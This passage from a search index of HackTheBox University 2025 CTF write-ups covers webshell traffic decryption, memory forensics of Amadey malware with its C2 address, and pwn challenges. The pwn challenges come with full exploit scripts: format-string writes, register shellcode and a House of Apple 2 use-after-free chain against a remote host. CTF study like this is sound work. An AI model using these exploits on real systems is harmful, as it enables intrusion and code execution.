openssl_encrypt($a54vag,\"AES-256-CBC\",$A4gVaGzH,OPENSSL_RAW_DATA,$A4gVaRmV);\necho base64_encode($A4gVaQdF); \n?&gt;\n</code></pre> <p>The script executes a command and encrypts the output. The variable handling the encrypted response is <code>$A4gVaQdF</code>.</p> <p>Answer: <code>$A4gVaQdF</code></p>"},{"location":"HackTheBox-University2025/forensics/a_trail_of_snow_and_deception/description/#decrypting-traffic","title":"Decrypting Traffic","text":"<p>To find the answers to the remaining questions, we extracted the AES key and IV from the malicious script above:</p> <ul> <li>Key: <code>kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G</code></li> <li>IV: <code>pZ7qR1tLw8Df3XbK</code></li> <li>Mode: AES-256-CBC</li> </ul> <p>We applied this decryption to the subsequent command outputs found in the traffic.</p>"},{"location":"HackTheBox-University2025/forensics/a_trail_of_snow_and_deception/description/#what-is-the-system-machine-hostname","title":"What is the system machine hostname?","text":"<p>Decrypting the command output where the attacker queried the system identity revealed the answer.</p> <p>Answer: <code>www-data</code></p>"},{"location":"HackTheBox-University2025/forensics/a_trail_of_snow_and_deception/description/#what-is-the-database-password-used-by-cacti","title":"What is the database password used by Cacti?","text":"<p>Decrypting the output where the attacker dumped the configuration (likely <code>config.php</code>), we found the database connection details.</p> <p>Evidence:</p> <pre><code>$database_password = 'zqvyh2fLgyhZp9KV';\n</code></pre> <p>Answer: <code>zqvyh2fLgyhZp9KV</code></p>"},{"location":"HackTheBox-University2025/forensics/santa_giveaway/description/","title":"Description","text":""},{"location":"HackTheBox-University2025/forensics/santa_giveaway/description/#santa-giveaway","title":"Santa Giveaway","text":"<p>Description: At Wintercrest Workshop, an employee ran a cheerful holiday giveaway helper that left behind a shimmerdust\u2011thin trail no one noticed at first. That single action set off a quiet compromise beneath the system\u2019s surface. You are provided only with a full memory dump. Reconstruct the incident using volatile artifacts: identify the process that began the chain, uncover the in\u2011memory traces it left behind, and extract the command line showing how the intruder secured its foothold.</p>"},{"location":"HackTheBox-University2025/forensics/santa_giveaway/description/#initial-analysis","title":"Initial Analysis","text":"<p>We are provided with a memory snapshot (<code>.vmem</code> and <code>.vmsn</code>). We start by identifying the system profile using Volatility 3 to ensure we use the correct profiles/symbols.</p> <pre><code>vol -f Challenge-Snapshot.vmem windows.info\n</code></pre> <p>Output:</p> <pre><code>Variable        Value\nKernel Base     0xf8035941e000\nDTB             0x1ab000\nIs64Bit         True\nLayer_name      0 WindowsIntel32e\nNtSystemRoot    C:\\Windows\nNtMajorVersion  10\nNtMinorVersion  0\nSystemTime      2025-11-22 15:12:38+00:00\n</code></pre>"},{"location":"HackTheBox-University2025/forensics/santa_giveaway/description/#1-process-identification","title":"1. Process Identification","text":"<p>To identify the malicious activity, we list the running processes. We are looking for anything suspicious or out of place.</p> <pre><code>vol -f Challenge-Snapshot.vmem windows.pslist\n</code></pre> <p>Output:</p> <pre><code>PID     PPID    ImageFileName   Offset(V)       CreateTime                   \n...\n6520    2008    rgbux.exe       0xe786d4c2e080  2025-11-22 15:08:01.000000 UTC\n</code></pre> <p>We identify <code>rgbux.exe</code> as the suspicious process. Searching for this executable name online links it to the Amadey malware family (likely the intended answer for the \"Malware Family\" question, noted as amaley in the logs).</p> <ul> <li>Malicious Process: <code>rgbux.exe</code></li> <li>PID: <code>6520</code></li> </ul>"},{"location":"HackTheBox-University2025/forensics/santa_giveaway/description/#2-file-artifacts-launch-location","title":"2. File Artifacts &amp; Launch Location","text":"<p>Next, we determine where the malware was executed from by scanning for file objects in memory containing \"download\" strings.</p> <pre><code>vol -f Challenge-Snapshot.vmem windows.filescan | grep -i \"download\"\n</code></pre> <p>Output Snippet:</p> <pre><code>0xe786d38b3780  \\Users\\user\\Downloads\\DiscordGiveaway.exe\n</code></pre> <p>This reveals the original executable name and path.</p> <ul> <li>Launch Path: <code>\\Users\\user\\Downloads\\DiscordGiveaway.exe</code></li> </ul>"},{"location":"HackTheBox-University2025/forensics/santa_giveaway/description/#3-network-analysis","title":"3. Network Analysis","text":"<p>We check the network connections associated with the memory dump to find the Command and Control (C2) server.</p> <pre><code>vol -f Challenge-Snapshot.vmem windows.netscan\n</code></pre> <p>Reviewing the output for PID <code>6520</code> (rgbux.exe), we find an active connection.</p> <ul> <li>C2 Address: <code>89.58.51.107:80</code></li> </ul>"},{"location":"HackTheBox-University2025/forensics/santa_giveaway/description/#4-initial-compromise-vector","title":"4. Initial Compromise Vector","text":"<p>To find the source URL where the user downloaded the malware, we use <code>strings</code> on the memory dump and grep for the executable name found earlier (<code>DiscordGiveaway</code>) and HTTP protocols.</p> <pre><code>strings Challenge-Snapshot.vmem | grep -i \"discordgiveaway\" | grep -i \"http\"\n</code></pre> <p>Output:</p> <pre><code>http://graveyard.htb:8000/DiscordGiveaway.exe\n</code></pre> <ul> <li>Download URL: <code>http://graveyard.htb:8000/DiscordGiveaway.exe</code></li> </ul>"},{"location":"HackTheBox-University2025/forensics/santa_giveaway/description/#timestamp-analysis","title":"Timestamp Analysis","text":"<p>To determine when the download occurred, we look for HTTP headers or metadata surrounding the URL in the memory dump.</p> <pre><code>strings Challenge-Snapshot.vmem | grep -B 20 \"graveyard.htb:8000/DiscordGiveaway.exe\" | grep -E \"15:0[0-9]:[0-9]{2}|2025-11-22\"\n</code></pre> <p>Output:</p> <pre><code>Date: Sat, 22 Nov 2025 15:07:21 GMT\n</code></pre> <ul> <li>Download Time: <code>2025-11-22 15:07:21</code></li> </ul>"},{"location":"HackTheBox-University2025/forensics/santa_giveaway/description/#5-persistence-mechanisms","title":"5. Persistence Mechanisms","text":"<p>Finally, we investigate persistence. The malware created a scheduled task. We can explore the Windows Registry hives in memory to find the task details.</p> <pre><code># List tasks in the Schedule Tree\nvol -f Challenge-Snapshot.vmem windows.registry.printkey --key \"Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\"\n</code></pre> <p>We see a key named <code>rgbux.exe</code>. To find its GUID, we query that specific key:</p> <pre><code>vol -f Challenge-Snapshot.vmem windows.registry.printkey --key \"Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\rgbux.exe\"\n</code></pre> <p>Output:</p> <pre><code>Key: rgbux.exe\nValues:\n...\nId: {81A3950E-EE73-4DB9-B670-DF3979056B48}\n</code></pre> <ul> <li>Scheduled Task GUID: <code>{81A3950E-EE73-4DB9-B670-DF3979056B48}</code></li> </ul>"},{"location":"HackTheBox-University2025/forensics/santa_giveaway/description/#summary-of-findings","title":"Summary of Findings","text":"Question Answer Download URL <code>http://graveyard.htb:8000/DiscordGiveaway.exe</code> Malicious Process (PID) <code>6520</code> (rgbux.exe) Launch Path <code>\\Users\\user\\Downloads\\DiscordGiveaway.exe</code> C2 IP:Port <code>89.58.51.107:80</code> Task GUID <code>{81A3950E-EE73-4DB9-B670-DF3979056B48}</code> Download Date <code>2025-11-22 15:07:21</code> Malware Family Amadey"},{"location":"HackTheBox-University2025/pwn/feel_my_terror/description/","title":"Description","text":""},{"location":"HackTheBox-University2025/pwn/feel_my_terror/description/#feel-my-terror","title":"Feel My Terror","text":"<p>Description: These mischievous elves have scrambled the good kids\u2019 addresses! Now the presents can\u2019t find their way home. Please help me fix them quickly \u2014 I can\u2019t sort this out on my own.</p>"},{"location":"HackTheBox-University2025/pwn/feel_my_terror/description/#initial-analysis","title":"Initial Analysis","text":"<p>We are provided with a binary that asks us to fix some \"addresses\". Let's examine the decompiled code in Ghidra to understand the logic.</p>"},{"location":"HackTheBox-University2025/pwn/feel_my_terror/description/#the-main-function","title":"The <code>main</code> Function","text":"<pre><code>undefined8 main(void) {\n  // ... [Variable declarations]\n  local_10 = *(long *)(in_FS_OFFSET + 0x28);\n\n  // [Zeroing out local_d8 buffer truncated for brevity]\n\n  info(\"Look at the mess the ELVES made:...\");\n  // Prints current values of arg1, arg2, arg3, arg4, arg5\n\n  read(0, local_d8, 0xc5); // Reads user input\n\n  printf(local_d8);        // &lt;--- VULNERABILITY: Format String\n  fflush(stdout);\n\n  check_db();              // Checks if we fixed the values\n\n  return 0;\n}\n</code></pre> <p>The critical vulnerability is <code>printf(local_d8)</code>. Since the program prints our input buffer directly without a format specifier (like <code>\"%s\"</code>), we have a Format String Vulnerability. This allows us to read from and write to arbitrary memory addresses.</p>"},{"location":"HackTheBox-University2025/pwn/feel_my_terror/description/#the-check_db-function","title":"The <code>check_db</code> Function","text":"<p>The program checks if we have successfully modified specific global variables (<code>arg1</code> through <code>arg5</code>).</p> <pre><code>void check_db(void) {\n  // ... [Opens flag.txt]\n\n  // The check:\n  if ((((arg1 == -0x21524111) &amp;&amp; (arg2 == 0x1337c0de)) &amp;&amp; (arg3 == -0xcc84542)) &amp;&amp;\n     ((arg4 == 0x1337f337 &amp;&amp; (arg5 == -0x5211113)))) {\n\n    success(\"Thanks a lot my friend &lt;3. Take this gift from me: \\n\");\n    puts(local_48); // Prints flag\n  }\n  // ...\n}\n</code></pre> <p>We need to overwrite these 5 global variables with specific values to pass the check and get the flag.</p>"},{"location":"HackTheBox-University2025/pwn/feel_my_terror/description/#binary-protections","title":"Binary Protections","text":"<p>Checking the binary security features is crucial for determining our exploit strategy.</p> <pre><code>Arch:     amd64-64-little\nRELRO:    Full RELRO\nStack:    Canary found\nNX:       NX enabled\nPIE:      No PIE (0x400000)\n</code></pre> <ul> <li>No PIE: This is excellent news. It means the addresses of the global variables (<code>arg1</code> - <code>arg5</code>) are static. We don't need to leak a base address; we can hardcode the target addresses in our script.</li> <li>Full RELRO: We cannot overwrite the GOT (Global Offset Table), but that doesn't matter since we are targeting specific variables in the <code>.bss</code> section, not function pointers.</li> </ul>"},{"location":"HackTheBox-University2025/pwn/feel_my_terror/description/#exploit-strategy","title":"Exploit Strategy","text":"<ol> <li>Identify Target Values: We need to convert the signed integers from the <code>if</code> statement into unsigned hex values for our payload.</li> <li><code>arg1</code>: <code>-0x21524111</code> <code>0xDEADBEEF</code></li> <li><code>arg2</code>: <code>0x1337c0de</code></li> <li><code>arg3</code>: <code>-0xcc84542</code> <code>0xF337BABE</code></li> <li><code>arg4</code>: <code>0x1337f337</code></li> <li> <p><code>arg5</code>: <code>-0x5211113</code> <code>0xFADEEEED</code></p> </li> <li> <p>Determine Offset: By sending a cyclic pattern (e.g., <code>AAAA%p%p...</code>) to the binary, we determined the format string offset is 6. This is where our input begins on the stack.</p> </li> <li>Construct Payload: We will use <code>pwntools</code> to generate a payload that uses <code>%n</code> specifiers to write the required values to the addresses of <code>arg1</code>-<code>arg5</code>.</li> <li>Constraint: The <code>read</code> buffer is only <code>0xc5</code> (197) bytes. We must ensure our payload fits. Using <code>write_size='short'</code> splits the writes into 2-byte chunks, which is generally more space-efficient than writing 1 byte at a time or full 4-byte integers.</li> </ol>"},{"location":"HackTheBox-University2025/pwn/feel_my_terror/description/#the-exploit-script","title":"The Exploit Script","text":"<pre><code>from pwn import *\nimport ctypes\n\n# Set up the binary context\nexe = ELF('./vuln_binary')\ncontext.binary = exe\ncontext.log_level = 'info'\n\n# 1. Get the static addresses of the target variables (No PIE)\narg1_addr = exe.symbols['arg1']\narg2_addr = exe.symbols['arg2']\narg3_addr = exe.symbols['arg3']\narg4_addr = exe.symbols['arg4']\narg5_addr = exe.symbols['arg5']\n\nlog.info(f\"Targeting addresses starting at: {hex(arg1_addr)}\")\n\n# 2. Define the Offset\noffset = 6\n\n# Helper to convert signed ints to unsigned 32-bit integers\ndef get_val(v):\n    return ctypes.c_uint32(v).value\n\n# 3. Define the values we need to write\nwrites = {\n    arg1_addr: get_val(-0x21524111), # 0xDEADBEEF\n    arg2_addr: get_val(0x1337c0de),  # 0x1337C0DE\n    arg3_addr: get_val(-0xcc84542),  # 0xF337BABE\n    arg4_addr: get_val(0x1337f337),  # 0x1337F337\n    arg5_addr: get_val(-0x5211113)   # 0xFADEEEED\n}\n\n# 4. Generate the payload\n# We use 'short' (2 bytes) writes to optimize payload size\npayload = fmtstr_payload(offset, writes, write_size='short')\n\n# Check if we fit inside the 197 byte buffer\nif len(payload) &gt; 197:\n    log.warning(f\"Payload length {len(payload)} is too large! Trying byte optimization...\")\n    payload_byte = fmtstr_payload(offset, writes, write_size='byte')\n    if len(payload_byte) &lt; len(payload):\n        log.info(f\"Switched to byte writes. New length: {len(payload_byte)}\")\n        payload = payload_byte\n\nlog.info(f\"Final Payload length: {len(payload)}\")\n\n# 5. Send the exploit\n# p = remote('IP', PORT) \np = process(exe.path) # For local testing\np.recvuntil(b\"&gt; \")\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"HackTheBox-University2025/pwn/feel_my_terror/description/#result","title":"Result","text":"<p>Running the script overwrites the variables in memory. The <code>check_db</code> function validates the new values, passes the check, and prints the flag.</p>"},{"location":"HackTheBox-University2025/pwn/shl33t/description/","title":"Description","text":""},{"location":"HackTheBox-University2025/pwn/shl33t/description/#shl33t","title":"SHL33T","text":"<p>Description: The mischievous elves have tampered with Nibbletop\u2019s registers\u2014most notably the EBX register\u2014and now he\u2019s stuck, unable to continue delivering Christmas gifts. Can you step in, restore his register, and save Christmas once again for everyone?</p>"},{"location":"HackTheBox-University2025/pwn/shl33t/description/#analysis","title":"Analysis","text":"<p>We start by analyzing the provided binary in Ghidra. The <code>main</code> function reveals the following logic:</p> <pre><code>/* WARNING: Removing unreachable block (ram,0x00101ab6) */\n\nundefined8 main(void)\n\n{\n  long lVar1;\n  code *__buf;\n  ssize_t sVar2;\n  long in_FS_OFFSET;\n\n  lVar1 = *(long *)(in_FS_OFFSET + 0x28);\n  banner();\n  signal(0xb,handler);\n  signal(4,handler);\n  info(\"These elves are playing with me again, look at this mess: ebx = 0x00001337\\n\");\n  info(\"It should be ebx = 0x13370000 instead!\\n\");\n  info(\"Please fix it kind human! SHLeet the registers!\\n\\n$ \");\n\n  // Allocate executable memory (RWX permissions: 7)\n  __buf = (code *)mmap((void *)0x0,0x1000,7,0x22,-1,0);\n  if (__buf == (code *)0xffffffffffffffff) {\n    perror(\"mmap\");\n    exit(1);\n  }\n\n  // Read exactly 4 bytes from stdin\n  sVar2 = read(0,__buf,4);\n\n  if (0 &lt; sVar2) {\n    // Execute the buffer\n    (*__buf)();\n\n    fail(\"Christmas is ruined thanks to you and these elves!\\n\");\n    if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {\n      return 0;\n    }\n    __stack_chk_fail();\n  }\n  fail(\"No input given!\\n\");\n  exit(1);\n}\n</code></pre> <p>The decompilation shows that <code>mmap</code> allocates executable memory, and <code>read</code> takes exactly 4 bytes of input which are immediately executed. Ghidra marks some blocks as \"unreachable,\" so we inspect the Assembly to understand what happens after execution.</p>"},{"location":"HackTheBox-University2025/pwn/shl33t/description/#assembly-inspection","title":"Assembly Inspection","text":"<pre><code>                             LAB_00101a9a                                    XREF[1]:     00101a7a (j)   \n        00101a9a 48  8b  45  d0    MOV        RAX ,qword ptr [RBP  + local_38 ]\n        00101a9e 48  89  45  e0    MOV        qword ptr [RBP  + local_28 ],RAX\n        00101aa2 48  8b  45  e0    MOV        RAX ,qword ptr [RBP  + local_28 ]\n        00101aa6 ff  d0           CALL       RAX                                      ; Call our shellcode\n        00101aa8 89  d8           MOV        EAX ,EBX                                 ; Move EBX result to EAX\n        00101aaa 89  45  cc       MOV        dword ptr [RBP  + local_3c ],EAX\n        00101aad 81  7d  cc       CMP        dword ptr [RBP  + local_3c ],0x13370000  ; Check if result is 0x13370000\n                 00  00  37  13\n        00101ab4 75  3c           JNZ        LAB_00101af2                             ; Jump if not equal\n        00101ab6 48  8d  05       LEA        RAX ,[s_HOORAY!_You_saved_Christmas_agai_00102f \n                 63  14  00  00\n        ...\n        00101ac5 e8  d4  fb       CALL       success                                  ; Call success function\n                 ff  ff\n        00101aca 48  8d  05       LEA        RAX ,[s_cat_flag.txt_00102f59 ]          = \"cat flag.txt\"\n                 88  14  00  00\n        00101ad1 48  89  c7       MOV        RDI =&gt;s_cat_flag.txt_00102f59 ,RAX       = \"cat flag.txt\"\n        00101ad4 e8  d7  f6       CALL       &lt;EXTERNAL&gt;::system                       int system(char * __command)\n</code></pre> <p>The assembly confirms the logic:</p> <ol> <li>We execute our 4-byte shellcode.</li> <li>The program compares the value of <code>EBX</code> to <code>0x13370000</code>.</li> <li>If they match, it executes <code>cat flag.txt</code>.</li> </ol>"},{"location":"HackTheBox-University2025/pwn/shl33t/description/#solution","title":"Solution","text":"<p>The description and the check tell us that <code>EBX</code> starts as <code>0x00001337</code>. We need to transform it into <code>0x13370000</code>.</p> <p>This is a simple bitwise shift operation. By shifting the hex value <code>1337</code> to the left by 4 hex digits (which is 16 bits), we move it from the lower half of the register to the upper half.</p> <p>The instruction <code>SHL</code> (Shift Logical Left) is perfect for this. We need to fit this into 4 bytes.</p> <ul> <li>Instruction: <code>shl ebx, 16</code></li> <li>Opcode: <code>C1 E3 10</code> (3 bytes)</li> <li>Return: <code>ret</code> (1 byte)</li> </ul> <p>Total: 4 bytes.</p>"},{"location":"HackTheBox-University2025/pwn/shl33t/description/#exploit-script","title":"Exploit Script","text":"<pre><code>from pwn import *\n\n# Target configuration\n# p = remote('IP', PORT) \n\n# SHL ebx, 16 (shift left by 16 bits)\n# Opcode: C1 E3 10\nshellcode = asm('shl ebx, 16', arch='i386', os='linux')\n\n# Add a return instruction to cleanly exit back to main\nshellcode += asm('ret', arch='i386')\n\nprint(f\"Shellcode length: {len(shellcode)} bytes\")\nprint(f\"Shellcode (hex): {shellcode.hex()}\")\n\n# Send to the binary\np.sendline(shellcode)\np.interactive()\n</code></pre> <p>Sending these bytes modifies the register correctly, satisfying the comparison check and printing the flag.</p>"},{"location":"HackTheBox-University2025/pwn/starshard_core/description/","title":"Description","text":""},{"location":"HackTheBox-University2025/pwn/starshard_core/description/#starshard-core","title":"Starshard Core","text":"<p>Description: In the snow-glittered workshops of Tinselwick, a curious \u201cStarshard Console\u201d is used to arm tiny routines and stitch wish-scripts into the Great Snowglobe\u2019s heart. Each tinkerer signs in, names their ritual, and feeds a fragment of magic to be etched into the Starshard Core\u2019s log. But rumors say the console was built with a mischievous shortcut\u2014one that lets the Gingerbit Gremlin slip through the cracks if you greet it just the wrong way. Your job is to find that crack, and coax the console into opening a door it was never meant to show.</p>"},{"location":"HackTheBox-University2025/pwn/starshard_core/description/#initial-analysis","title":"Initial Analysis","text":"<p>We are provided with a binary and <code>libc-2.24</code>. Let's analyze the binary in Ghidra to understand the workflow.</p>"},{"location":"HackTheBox-University2025/pwn/starshard_core/description/#main-function","title":"Main Function","text":"<p>The main loop presents us with a menu. Crucially, it asks for a \"Tinkerer Name\" at the start.</p> <pre><code>/* Truncated main function */\nprintf(\"Tinselwick Tinkerer Name: \");\npcVar2 = fgets(console_state.tinkerer_name, 0x10, stdin);\n// ...\nprintf(\"=== Welcome \");\nprintf(console_state.tinkerer_name); // &lt;--- VULNERABILITY 1: Format String\n</code></pre> <p>We immediately spot a Format String Vulnerability in the greeting. Since we can read 16 bytes, we can use <code>%p</code> specifiers to leak addresses from the stack.</p>"},{"location":"HackTheBox-University2025/pwn/starshard_core/description/#the-menu-functions","title":"The Menu Functions","text":"<p>The program manages a <code>console_state</code> structure containing a file pointer (<code>core_log</code>) and a buffer for \"fragments\".</p> <ol> <li><code>arm_routine</code>: Opens a file (<code>fopen</code>) and assigns the pointer to <code>console_state.core_log</code>. It also asks for a spell name.</li> <li> <p>Vulnerability 2 (Buffer Overread): It reads 24 bytes for the name but prints it without ensuring a null terminator. Since the <code>core_log</code> file pointer resides immediately after the name in memory, filling the name buffer allows us to leak the heap address of the file structure.</p> </li> <li> <p><code>feed_fragment</code>: Allocates memory (<code>malloc</code>) based on user input size and reads data into it.</p> </li> <li><code>commit_routine</code>: Writes the fragment to the file using <code>fputs</code>.</li> <li> <p><code>cancel_routine</code>: Closes the file. <pre><code>void cancel_routine(void) {\n  if (console_state.core_log != 0) {\n    fclose(console_state.core_log);\n    // Dangling pointer! console_state.core_log is not set to NULL\n    puts(\"[*] Routine Cancelled.\");\n  }\n}\n</code></pre></p> </li> <li> <p>Vulnerability 3 (Use-After-Free): <code>fclose</code> frees the <code>FILE</code> structure on the heap, but the global pointer <code>console_state.core_log</code> is never nulled out.</p> </li> </ol>"},{"location":"HackTheBox-University2025/pwn/starshard_core/description/#the-goal","title":"The Goal","text":"<p>There is a \"win\" function provided:</p> <pre><code>void ginger_gate(void) {\n  setenv(\"XMAS\",\"The Gingerbit Gremlin listens.\",1);\n  system(\"/bin/sh\");\n}\n</code></pre>"},{"location":"HackTheBox-University2025/pwn/starshard_core/description/#exploitation-strategy","title":"Exploitation Strategy","text":"<p>Our path to the shell involves utilizing the Use-After-Free (UAF) to overwrite the freed <code>FILE</code> structure with a fake one, hijacking control flow to execute <code>ginger_gate</code>.</p>"},{"location":"HackTheBox-University2025/pwn/starshard_core/description/#1-information-leakage","title":"1. Information Leakage","text":"<p>We need three addresses to bypass protections (PIE, ASLR) and construct our fake file:</p> <ol> <li>Libc Base: Leaked via the Format String (Offset 9 on the stack).</li> <li>PIE Base: Leaked via the Format String (Offset 11 on the stack) to calculate the address of <code>ginger_gate</code>.</li> <li>Heap Address: Leaked via the Buffer Overread in <code>arm_routine</code>.</li> </ol>"},{"location":"HackTheBox-University2025/pwn/starshard_core/description/#2-heap-feng-shui-uaf","title":"2. Heap Feng Shui (UAF)","text":"<p>The <code>FILE</code> structure used by <code>fopen</code> is allocated on the heap.</p> <ol> <li>Call <code>arm_routine</code> to allocate the <code>FILE</code> struct.</li> <li>Call <code>cancel_routine</code> to <code>free()</code> it. The pointer remains dangling.</li> <li>Call <code>feed_fragment</code> to <code>malloc()</code> a chunk of the same size. The allocator (handling fastbins/tcache) will return the exact same chunk that used to hold the <code>FILE</code> struct.</li> <li>We write our payload into this chunk, effectively creating a fake <code>FILE</code> object pointed to by the dangling <code>core_log</code>.</li> </ol>"},{"location":"HackTheBox-University2025/pwn/starshard_core/description/#3-file-structure-exploitation-house-of-apple-2","title":"3. File Structure Exploitation (House of Apple 2)","text":"<p>We will use the House of Apple 2 technique. This technique abuses the <code>_IO_FILE</code> structure, specifically the <code>_wide_data</code> and vtables, to hijack execution when a file operation (like <code>fputs</code> in <code>commit_routine</code>) is performed.</p> <p>The Chain:</p> <ol> <li>We overwrite the object's vtable pointer to point to <code>_IO_wfile_jumps</code> (inside libc).</li> <li>This forces functions like <code>fputs</code> to use \"Wide Character\" logic, jumping to <code>_IO_wfile_overflow</code>.</li> <li><code>_IO_wfile_overflow</code> attempts to allocate a buffer by calling <code>_IO_wdoallocbuf</code>.</li> <li><code>_IO_wdoallocbuf</code> calls a function pointer located at <code>offset 0x68</code> of the <code>_wide_vtable</code>.</li> <li>We control the <code>_wide_data</code> pointer to point to our fake data, and the <code>_wide_vtable</code> to point to a fake table where <code>offset 0x68</code> is the address of <code>ginger_gate</code>.</li> </ol>"},{"location":"HackTheBox-University2025/pwn/starshard_core/description/#the-exploit-script","title":"The Exploit Script","text":"<pre><code>from pwn import *\n\n# Context setup\ncontext.log_level = 'debug'\nexe = ELF(\"./starshard_core\")\nlibc = ELF(\"./glibc/libc.so.6\") # Ensure this matches remote libc\ncontext.binary = exe\n\n# p = process(\"./starshard_core\")\np = remote('154.57.164.65', 31764)\n\np.recvuntil(b\"Name: \")\n\n# ==========================================================\n# STEP 1: Leak PIE and Libc Base (Format String)\n# ==========================================================\n# Offsets 9 and 11 determined via dynamic analysis\np.sendline(b\"%9$p%11$p\")\n\np.recvuntil(b\"Welcome \")\nraw_leak = p.recvline().strip()\nparts = raw_leak.split(b\"0x\")\n\nlibc_leak = int(parts[1], 16)\npie_leak  = int(parts[2].split()[0], 16)\n\n# Calculate bases using offsets found during analysis\nexe.address = pie_leak - 0x175e\nlibc.address = libc_leak - 0x2dfd0\n\nprint(f\"Libc Base: {hex(libc.address)}\")\nprint(f\"PIE Base:  {hex(exe.address)}\")\n\n# ==========================================================\n# STEP 2: Leak Heap Address (Buffer Overread)\n# ==========================================================\np.recvuntil(b'&gt; ')\np.sendline(b'1') # Arm Routine\n\n# Send 24 bytes to fill the buffer up to the file pointer\np.sendlineafter(b\"Name: \", b\"A\"*24)\np.recvuntil(b\"A\"*24)\n\n# Read the leaked pointer immediately following our buffer\nheap_leak = u64(p.recv(6).ljust(8, b\"\\x00\"))\nheap_base = heap_leak &amp; ~0xfff\nprint(f\"Heap Leak: {hex(heap_leak)}\")\n\n# ==========================================================\n# STEP 3: Trigger UAF and House of Apple 2\n# ==========================================================\n# Free the FILE chunk\np.sendlineafter(b\"&gt; \", b\"3\") # Cancel Routine\n\n# Calculate target addresses\ntarget_func = exe.symbols['ginger_gate']\nvtable = libc.sym['_IO_wfile_jumps'] \n\n# Fake pointers relative to our heap leak\n# The leak points to the start of the FILE struct\nsafe_ptr = heap_leak + 0x40          # Location for lock (needs to be writable/zero)\nfake_wide_data = heap_leak + 0xE0    # Fake _wide_data struct location\nfake_wide_vtable = heap_leak + 0x150 # Fake _wide_vtable location\n\n# Construct the fake FILE structure\npayload = flat({\n    0x00: \"  sh\",              # Padding / command\n    0x28: 0,                   # _IO_write_ptr\n    0x88: safe_ptr,            # _lock\n    0xA0: fake_wide_data,      # _wide_data pointer\n    0xD8: vtable,              # vtable pointer -&gt; _IO_wfile_jumps\n\n    # Fake _wide_data structure at offset 0xE0\n    0xE0 + 0x18: 0,  # _IO_write_base\n    0xE0 + 0x20: 0,  # _IO_write_ptr\n    0xE0 + 0x28: 0,  # _IO_write_end\n    0xE0 + 0x30: 0,  # _IO_buf_base\n    0xE0 + 0xE0: fake_wide_vtable, # Pointer to our fake wide vtable\n\n    # Fake wide vtable at offset 0x150\n    # _IO_wdoallocbuf calls function at offset 0x68\n    0x150 + 0x68: target_func \n\n}, filler=b'\\x00', length=464)\n\n# Re-allocate the freed chunk via malloc\np.sendlineafter(b\"&gt; \", b\"2\") # Feed Fragment\np.sendlineafter(b\"Size: \", b\"470\") # Request size large enough to get the FILE chunk\np.sendlineafter(b\"Fragment:\", payload)\n\n# Trigger file operation (fputs) to execute payload\np.sendlineafter(b\"&gt; \", b\"4\") # Commit Routine\n\np.interactive()\n</code></pre>"},{"location":"HackTheBox-University2025/reverse_engineering/cloudy_core/description/","title":"Description","text":""},{"location":"HackTheBox-University2025/reverse_engineering/cloudy_core/description/#cloudycore","title":"CloudyCore","text":"<p>Description: Twillie, the memory-minder, was rewinding one of her snowglobes when she overheard a villainous whisper. The scoundrel was boasting about hiding the Starshard's true memory inside this tiny memory core (.tflite). He was so overconfident, laughing that no one would ever think to reverse-engineer a 'boring' ML file. He said he 'left a little challenge for anyone who did,' scrambling the final piece with a simple XOR just for fun. Find the key, reverse the laughably simple XOR, and restore the memory.</p>"},{"location":"HackTheBox-University2025/reverse_engineering/cloudy_core/description/#analysis","title":"Analysis","text":"<p>In this challenge, we are provided with a <code>.tflite</code> file, which is a standard format for TensorFlow Lite machine learning models. The description hints at two critical pieces of information:</p> <ol> <li>The flag is hidden inside the model.</li> <li>The final piece is scrambled with a simple XOR.</li> </ol>"},{"location":"HackTheBox-University2025/reverse_engineering/cloudy_core/description/#1-extracting-model-tensors","title":"1. Extracting Model Tensors","text":"<p>First, I wrote a script to analyze the model and extract the payload and constants using the <code>tensorflow</code> library. The script (<code>extract.py</code>) is included in this directory.</p> <p>Running the script produced the following output:</p> <p>The output reveals three specific tensors:</p> <ul> <li>Payload Raw: <code>909fe613</code></li> <li>Meta Raw: <code>f09fe613df70000010a0e613df700000</code></li> <li>Const Raw: <code>13af8a291a990fef5a1b3488e7444f0959bd76134500570b5d7dd0246b5e5b29e3000000</code></li> </ul> <p>The Const Raw value is the most interesting; its length and structure suggest it might be the encrypted flag.</p>"},{"location":"HackTheBox-University2025/reverse_engineering/cloudy_core/description/#2-finding-the-key","title":"2. Finding the Key","text":"<p>According to the description, we need a key to XOR this data. I analyzed the binary structure of the <code>.tflite</code> file directly using <code>xxd</code> to look for string artifacts or hidden keys.</p> <p>I found a suspicious sequence near offset <code>0x210</code>:</p> <pre><code>00000210: 1000 0000 6b00 4000 3300 4000 7900 4000  ....k.@.3.@.y.@.\n00000220: 2100 4000 0000 0600 0800 0400 0600 0000  !.@.............\n00000230: 0400 0000 2400 0000 13af 8a29 1a99 0fef  ....$......)....\n</code></pre> <p>If we filter out the null bytes and the <code>@</code> symbols from the ASCII representation, the string <code>k3y!</code> clearly stands out. This is our XOR key.</p>"},{"location":"HackTheBox-University2025/reverse_engineering/cloudy_core/description/#3-decryption","title":"3. Decryption","text":"<p>With the encrypted bytes and the key, I moved to CyberChef to solve the challenge.</p> <ol> <li>From Hex: Input the <code>Const Raw</code> data.</li> <li>XOR: Apply the key <code>k3y!</code>.</li> <li>Result: <code>78 9c f3 42 29 e0 64 dc 23 70 07 f1 8c 77 36 62 6a c4 1d 20 3c 6b 64 72 36 4e a9 4f 58 27 30 1a 9a 6b 33 79</code></li> </ol> <p>The resulting bytes start with <code>78 9c</code>. This is the standard magic number for a zlib compressed stream.</p> <ol> <li>Zlib Inflate: Decompressing the data reveals the final flag.</li> </ol>"},{"location":"HackTheBox-University2025/reverse_engineering/startshard_reassembly/description/","title":"Description","text":""},{"location":"HackTheBox-University2025/reverse_engineering/startshard_reassembly/description/#starshard-reassembly","title":"Starshard Reassembly","text":"<p>Description: Twillie Snowdrop, the village's Memory-Minder, has discovered that one of her enchanted snowglobes has gone cloudy, its Starshard missing and its memories scrambled. To restore the scene within, you must provide the correct sequence of \"memory shards\". The binary will accept your attempt and reveal whether the Starshard glows once more. Can you decipher the snowglobe\u2019s secret and bring the memory back to life?</p>"},{"location":"HackTheBox-University2025/reverse_engineering/startshard_reassembly/description/#initial-analysis","title":"Initial Analysis","text":"<p>We are provided with a binary ELF file which we need to reverse. We upload 